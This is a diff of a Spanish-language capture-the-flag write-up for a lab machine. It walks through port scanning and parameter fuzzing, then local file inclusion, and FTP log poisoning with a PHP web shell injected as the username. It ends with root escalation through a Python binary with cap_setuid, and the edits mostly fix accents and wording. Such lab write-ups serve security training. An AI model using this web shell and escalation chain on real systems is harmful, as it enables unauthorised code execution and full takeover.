@@ -13,13 +13,13 @@ nmap 172.17.0.2 -sS -sVC -n -Pn -p- --open --min-rate 5000
 Podemos ver que estan abiertos los puertos TCP 80 y 21, por lo que procederemos a investigar la web.
 
 ## Paso N2: Busqueda de parametros vulnerables
-Al investigar la pagina, podemos llegar a entrar a una direccion con el parametro ```page```.
+Al investigar la página, podemos llegar a entrar a una dirección con el parámetro ```page```.
 ```
 http://172.17.0.2/index.php?page=menu
 ```
-Buscaremos algún parametro vulnerable para poder ejecutar comandos y realizar un Local FIle Inclusion.
+Buscaremos algún parámetro vulnerable para poder ejecutar comandos y realizar un Local FIle Inclusion.
 
-Para ello utilizaremos ```wfuzz``` para buscar diferentes parametros vulnerables con el siguiente comando.
+Para ello utilizaremos ```wfuzz``` para buscar diferentes parametros vulnerables con el siguiente comando:
 ```
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hl 29 -u http://172.17.0.2/index.php?FUZZ=test
 ```
@@ -27,22 +27,23 @@ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -
 
 Encontramos el parámetro vulnerable *studio*, por lo que podemos movernos libremente por los recursos internos de la web.
 
-## Paso N3: Entrar a logs del servicio ftp
+## Paso N3: Entrar a logs del servicio ftp (LFI)
 Debemos entrar a los logs del servicio ftp, los cuales generalmente estan ubicados en ```/var/log/vsftpd.log```.
 ```
 http://172.17.0.2/index.php?studio=/var/log/vsftpd.log
 ```
 ![vsftpd logs](images/img3.png)
-Tenemos acceso a los logs del servicio ftp, por lo que intentaremos inyectar codigo php para movernos en el sistema y lograr ejecutar comandos en el.
 
-## Paso N4: FTP LogPoisoning + LFI
-entraremos al servicio ftp con el comando ```ftp 172.17.0.2``` y pondremos de nombre el siguiente codigo php.
+Tenemos acceso a los logs del servicio ftp, por lo que intentaremos inyectar código php para movernos en el sistema y lograr ejecutar comandos en el.
+
+## Paso N4: FTP LogPoisoning
+entraremos al servicio ftp con el comando ```ftp 172.17.0.2``` y pondremos de nombre el siguiente código php.
 ```
 <?php system($_GET['cmd']); ?>
 ```
-una vez ejecutado, podremos ejecutar comando dentro de la pagina y se veran reflejados en el log.
+Una vez ejecutado, podremos ejecutar comando dentro de la página y se verán reflejados en los logs.
 
-ahora, podremos ejecutar comando usando:
+ahora, podremos ejecutar comandos usando:
 ```
 http://172.17.0.2/index.php?studio=/var/log/vsftpd.log&cmd=command
 ```
@@ -72,19 +73,21 @@ sudo -u hannah /sbin/debugfs -w /opt/hannah_disk.img
 Una vez ejecutado, accederemos al usuario hannah.
 
 ## Paso N7: Escalando privilegios
-Una vez estando en el usuario hannah, investigando los directorios principales nos daremos cuenta que en la carpeta /opt hay un archivo llamado priv-python el cual el dueño es root con grupo hannah y tenemos permiso de lectura y ejecucion.
-![priv-python](/images/img4)
+Una vez estando en el usuario hannah, investigando los directorios principales nos daremos cuenta que en la carpeta /opt hay un archivo llamado priv-python el cual el dueño es root con grupo hannah y tenemos permiso de lectura y ejecución.
+![priv-python](images/img4)
 
 Verificamos si el archivo tiene capabilities con el siguiente comando:
 ```
 getcap /opt/priv-python
 ```
 ![getcap](images/img5.png)
-vemos que nos devuelve ```cap_setuid=ep```. Las capabilities son permisos especificos, en este caso, la capability ```cap_setuid=ep``` le da a este binario el permiso especifico de cambiar su UID a cualquier valor.
+
+Vemos que nos devuelve ```cap_setuid=ep```. Las capabilities son permisos especìficos, en este caso, la capability ```cap_setuid=ep``` le da a este binario el permiso específico de cambiar su UID a cualquier valor.
 Por lo que si ejecutamos el siguiente comando:
 ```
 /opt/priv-python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 ```
 Nos convertiremos en usuarios root.
-Este comando indica que queremos usar herramientas de configuracion a nivel de sistema operativo ```import.os;```, cambiandonos nuestro uid a cero (uid 0 = root) ```os.setuid(0);``` y abriendo una nueva bash luego de usar el intreprete de python ```os.system("/bin/sh")```.
+Este comando indica que queremos usar herramientas de configuración a nivel de sistema operativo ```import.os;```, cambiandonos nuestro uid a cero (uid 0 = root) ```os.setuid(0);``` y abriendo una nueva shell luego de usar el intèrprete de python ```os.system("/bin/sh")```.
+
 ![root py](images/img6.png)
